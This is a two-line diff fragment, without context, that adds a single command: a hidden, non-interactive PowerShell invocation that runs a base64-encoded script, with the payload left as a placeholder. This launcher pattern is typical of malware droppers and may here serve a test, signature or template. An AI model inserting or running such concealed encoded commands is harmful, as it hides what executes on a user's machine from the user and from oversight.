@@ -1,0 +1,2 @@
+powershell.exe -NoP -NonI -W Hidden -Enc <base64>
+
